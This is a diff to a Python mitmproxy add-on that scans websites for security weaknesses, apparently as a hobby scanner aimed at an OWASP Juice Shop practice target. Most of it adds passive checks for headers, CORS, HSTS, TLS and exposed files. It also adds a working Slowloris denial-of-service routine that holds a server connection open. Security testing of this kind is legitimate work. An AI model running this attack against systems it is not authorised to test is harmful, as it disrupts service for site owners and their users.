@@ -8,12 +8,21 @@
 import logging
 import re
 import copy
+import hashlib
 import random
+import socket
+import time
+import json
+import ssl
+
 from urllib.parse import urlparse
+
 from enum import Enum
 from known_risks_data import compomised_external_sites
+from ssl_utils import skan_domain_ssl
 from mitmproxy import ctx
 import networkx as nx
+
 
 G = nx.Graph()
 
@@ -57,8 +66,9 @@ class SkannedVulnerabilityType(Enum):
     INFO_SERVER_INFRA_HOSTING_PROVIDER = 42
     INFO_SERVER_INFRA_LOAD_BALANCE = 43
     INFO_SERVER_INFRA_TLS = 44
-    INFO_SERVER_INFRA_TLS = 44
+    # INFO_SERVER_INFRA_TLS = 44
 
+    ATTACK_SERVER_SLOWLORIS = 47
 
     #-- Information only and not directly a vulnerability
 
@@ -74,12 +84,32 @@ class SkannedVulnerability:
         self.short_message = short_message
         self.long_message = long_message
 
+    def list_id(self) -> str:
+        return hashlib.md5(f"{self.short_message}+{self.long_message}".encode("utf-8")).hexdigest()
+
+    def vuln_type_display(self) -> str:
+        return self.vuln_type.name
 
 class PublishVulnerabilities:
     discoverd_vulns : list[SkannedVulnerability] = []
     
     def add(self, v: SkannedVulnerability):
         self.discoverd_vulns += [v]
+        self.update_data()
+
+    def extend(self, v: list[SkannedVulnerability]):
+        self.discoverd_vulns += v
+        self.update_data()
+
+    def update_data(self):
+        path_to_data_out = r"C:\Users\ragla\Documents\coding_projects\vskan\mitm-addon\ui_server\data.json"
+        with open(path_to_data_out, "w") as f:
+            
+            f.write(
+                f"{json.dumps([{'id': d.list_id() , 'vuln_type': d.vuln_type_display()} for d in self.discoverd_vulns])}")
+        
+
+        logging.info(f"sv from c: {self.discoverd_vulns}")
 
 pl = PublishVulnerabilities()
 
@@ -225,13 +255,42 @@ def code_disclosure_check(flow):
     pass
 
 
+def probe_send_spring_actuator_info_leak(flow):
+    #TODO
+    # - https://www.zaproxy.org/docs/alerts/40042/
+    pass
+
+
+def probe_test_spring_actuator_info_leak(flow):
+    #TODO
+    # - https://www.zaproxy.org/docs/alerts/40042/
+    pass
+
 def watch_known_web_server_software(flow):
-    # Java Spring
+    x_powered_by_header_value = flow.response.headers.get("X-Powered-By") 
+
+
+    # Java 
+
+    # - #TODO: Check if ..jsp in url
+    if('.jsp' in flow.request.url):
+        logging.warn("Web app powered by Java")
 
     # ASP.NET
+    if('.aspx' in flow.request.url or '.asp' in flow.request.url ):
+        logging.warn("Web app powered by ASP.NET")
+
 
     # Wordpress
+        #TODO: Check for /wp-admin
 
+    # PHP
+    if('.php' in flow.request.url):
+        logging.warn("Web app powered by php")
+
+
+    if(x_powered_by_header_value and ('php' in x_powered_by_header_value.lower())):
+        logging.warn(f"Using PHP software stack: {x_powered_by_header_value}")
 
     # --- Frontend ---
 
@@ -246,11 +305,33 @@ def watch_known_web_server_software(flow):
     pass
 
 def watch_known_web_server_infra(flow):
+    x_powered_by_header_value = flow.response.headers.get("X-Powered-By") 
+    x_server_header_values = flow.response.headers.get_all("Server") or []
+
+    if(x_powered_by_header_value):
+        logging.warn(f"X-Powered-By is not suppressed. It's value is {x_powered_by_header_value}")
+
+    if(x_server_header_values):
+        logging.warn(f"Server values in header: {x_server_header_values}")
+
     # Apache
+    # - TODO.. The header contains "Apache"
 
     # nginx
+    # - TODO.. The header contains `nginx`
 
-    # IIS
+    # MS
+    if(x_powered_by_header_value and 'ASP.NET' in x_powered_by_header_value):
+        logging.warn("Server software uses ASP.NET")
+
+    for k, v in flow.response.headers.items(multi=False):
+        if 'AspNet' in k:
+            logging.warn(f"ASP.NET header found. {k}: {v}")
+
+    headers_indicating_msft_stack = [m for m in x_server_header_values if ('Microsoft' in m) or ('IIS' in m)]
+    
+    if(headers_indicating_msft_stack):
+        logging.warn(f"Found headers indicating server run on Windows server tech: {headers_indicating_msft_stack}")
 
     # Hosting provider
 
@@ -267,8 +348,10 @@ def check_https_usage(flow):
     #TODO: check cipher suites
     if flow.request.scheme == 'http':
         if flow.response.status_code < 400:
-            logging.error(f"Got a non error response when using http for {flow.request.host} {flow.request.path}")
-
+            logging.warn(f"Got a non error response when using http for {flow.request.host} {flow.request.path}")
+            pl.add(SkannedVulnerability(SkannedVulnerabilityType.HTTP_SCHEME_USAGE, 
+                 'Site uses http protocol'
+                , None))
     
 
 def http_redirect_check(flow_saves):
@@ -315,29 +398,56 @@ def hsts_header_check(flow_saves):
 
     if not len(truthy_hsts_value):
         logging.warn("HSTS header doesn't seem to be set")
+        pl.add(SkannedVulnerability(SkannedVulnerabilityType.HEADER_HSTS_SET, 
+                 'HSTS header is not set'
+                , None))
+    
         return
 
     included_subdomains = [h for h in truthy_hsts_value if 'includeSubDomains' in h]
 
     if not len(included_subdomains):
         logging.warn("HSTS header doesn't include subdomains")
+        pl.add(SkannedVulnerability(SkannedVulnerabilityType.HEADER_HSTS_SUBDOMAIN, 
+                 'HSTS header does not include subdomain'
+                , None))
+    
         
     
 
 def simple_header_info_leak_check(flow):
     x_powered_by_header_value = flow.response.headers.get("X-Powered-By") 
     x_backend_server_header_value = flow.response.headers.get("X-Backend-Server") 
+    x_debug_token_header_value = flow.response.headers.get("X-Debug-Token") 
+    x_debug_token_link_header_value = flow.response.headers.get("X-Debug-Token-Link") 
 
     if x_powered_by_header_value:
         # TODO read more: https://www.zaproxy.org/docs/alerts/10037/
         logging.warn("X-Powered-By is not suppressed")
+        pl.add(SkannedVulnerability(SkannedVulnerabilityType.HEADER_LEAK_X_POWERED_BY, 
+                 f"X-Powered-By : {x_powered_by_header_value}"
+                , None))
+    
 
 
     if x_backend_server_header_value:
         logging.warn("X-Backend-Server is not suppressed")
+        pl.add(SkannedVulnerability(SkannedVulnerabilityType.HEADER_LEAK_X_BACKEND_SERVER, 
+                 f"X-Backend-Server : {x_backend_server_header_value}"
+                , None))
+    
+
+    if x_debug_token_header_value or x_debug_token_link_header_value:
+        logging.warn("X-Debug-Token is not suppressed")
+
 
     if flow.response.headers.get("X-AspNet-Version"):
-        logging.warn("X-Backend-Server is not suppressed")
+        logging.warn("AspNet version header is not suppressed")
+
+    if (flow.response.headers.get("X-ChromeLogger-Data") or
+        flow.response.headers.get("X-ChromePhp-Data")
+    ):
+        logging.warn("Backend data sent using debug tools")
 
 
 
@@ -351,10 +461,18 @@ def check_cors(flow, flow_site_id, skan_mode):
 
     if not access_control_header:
         logging.warn("Access control header not set")
+
+        pl.add(SkannedVulnerability(SkannedVulnerabilityType.CORS_SET, 
+                 f"CORS header is not set"
+                , None))
+    
         return
     
     if access_control_header.strip() == '*':
         logging.warn("Access control header is allowing all")
+        pl.add(SkannedVulnerability(SkannedVulnerabilityType.CORS_ALL_ALLOWED, 
+                 f"CORS allows all origins"
+                , None))
 
     
     if skan_mode == 'probe':
@@ -373,14 +491,76 @@ def check_known_compromised_site(flow):
         return
 
     logging.warn(f"Attempted to connect to following compromised exteranal sites: {matched_with_known_risks}")
+    pl.add(SkannedVulnerability(SkannedVulnerabilityType.CONNECT_COMPROMISED_SITE, 
+                 f"Attempt to connect to known compromised sites"
+                , f"{matched_with_known_risks} are compromised."))
 
 def check_sensitive_in_get(flow):
     #TODO: read https://docs.gitlab.com/ee/user/application_security/dast/browser/checks/598.3.html
     pass
 
 
-def slow_lorris_attack(flow):
+def slow_lorris_https(flow):
     pass
+
+def slow_lorris_attack_http(flow, for_https = False):
+    # code from https://github.com/gkbrk/slowloris/blob/master/slowloris.py
+    logging.info("Attempting slowloris")
+    flow_referrrer = flow.request.headers.get('Referer')
+    # have to add one more r to compensate for this^
+
+    flow_domain = urlparse(flow_referrrer).netloc
+
+    ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
+    # Your target domain and port
+    host = flow_domain
+    port = 80  # Use 443 for HTTPS (you'll need to use ssl.wrap_socket then)
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+
+    if for_https:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        s = ctx.wrap_socket(s, server_hostname=host)
+
+    s.connect((host, port))
+    
+
+    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
+
+    s.send(f"User-Agent: {ua}\r\n".encode('utf-8'))
+    s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
+
+    head_ctr = 0;
+    sleep_time_interval = 1
+    max_try_to_warn = 33
+    # Slowly send headers, one at a time
+    try:
+        while True:
+            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
+            logging.info(f"[{head_ctr}]: Sent a keep-alive header...")
+            time.sleep(sleep_time_interval)  # Wait between sending headers
+            head_ctr += 1
+            
+            if head_ctr == max_try_to_warn:
+
+                pl.add(SkannedVulnerability(SkannedVulnerabilityType.ATTACK_SERVER_SLOWLORIS, 
+                 'Site is suceptible to Slowloris attack'
+                , f"Server kept HTTP connection open for {sleep_time_interval * max_try_to_warn} seconds"))
+             
+                s.close()
+                return
+
+    except Exception as e:
+        logging.info(f"Exiting due to {e}")
+
+    finally:
+        s.close()
+        logging.info("Finishing slowloris")
+        return
+
 
 def http_host_header_attack(flow):
     # https://portswigger.net/web-security/host-header/exploiting#connection-state-attacks
@@ -401,6 +581,12 @@ def attack_jwt_none_alg(flow):
     did_attack = False
     return did_attack
 
+def watch_ssl_vuln(flow):
+    r = skan_domain_ssl(flow)
+    logging.info(r)
+    pl_ = [SkannedVulnerability(SkannedVulnerabilityType.INFO_SERVER_INFRA_TLS, m, None) for _, m in r]
+    
+    pl.extend(pl_)
 
 class Skanner:
     def __init__(self):
@@ -411,7 +597,7 @@ class Skanner:
     # !! First matching rule will apply
     'owasp_juice' : {
             'url_regex': 'https?://juice-shop-p0va.onrender.com*',
-            'scan_mode': 'probe', # 'probe' | 'attack'
+            'scan_mode': 'attack', # 'watch' | 'probe' | 'attack'
             'flow_saves': [],
 
     },
@@ -501,10 +687,21 @@ class Skanner:
 
             if flow.request.path == '/.env' and flow.response.status_code < 400:
                 logging.warn(f"Got non error response for env file with content {flow.response.content}")
+                pl.add(SkannedVulnerability(SkannedVulnerabilityType.CONFIG_FILE_EXPOSURE_ENV, 
+                'Request to /.env did not return an error response'
+                , None))
+
 
 
             if flow.request.path == '/.git' and flow.response.status_code < 400:
                 logging.warn(f"Got non error response for /.git")
+                pl.add(SkannedVulnerability(SkannedVulnerabilityType.CONFIG_FILE_EXPOSURE_GIT, 
+                 'Request to /.git did not return an error response'
+                , None))
+
+
+            if 'actuator/health' in flow.request.path:
+                probe_test_spring_actuator_info_leak(flow)
 
             check_https_usage(flow)
 
@@ -543,7 +740,7 @@ class Skanner:
         check_https_usage(flow)
 
 
-        if len(self.target_sites[flow_site_id]['flow_saves']) < 1_000:
+        if len(self.target_sites[flow_site_id]['flow_saves']) < 40:
             # Not running forever, to avoid unnecessary noise
             watch_jwt(flow)
 
@@ -584,9 +781,8 @@ class Skanner:
                 and flow.request.method == 'GET'
 
             ):
-              # TODO ssl validate...
-              # only if the domain is matching.. else leave it
-              pass
+                watch_ssl_vuln(flow)
+                self.completed_attacks[f"ssl_watch_{flow_site_id}"] = True
 
             if (
                 not self.completed_attacks.get(f"code_exposure_{flow_site_id}") 
@@ -624,9 +820,6 @@ class Skanner:
                 hsts_header_check(self.target_sites[flow_site_id]['flow_saves'])
 
 
-            
-
-
 
         if flow_attack_mode == 'attack':
             #TODO wrtie attacking tests
@@ -637,13 +830,18 @@ class Skanner:
 
             
             # Slow Lorris
+             if (
+                not self.completed_attacks.get(f"slow_lorris_{flow_site_id}") 
+            ):
+                slow_lorris_attack_http(flow)  
+                self.completed_attacks[f"slow_lorris_{flow_site_id}"] = True
+                logging.info(f"completed attacks: {self.completed_attacks}")
+
+
 
             # HTTP host header
 
-
-
                 
-            pass
 
     # def done():
     #     logging.info("Shutting down.. Will generate report")
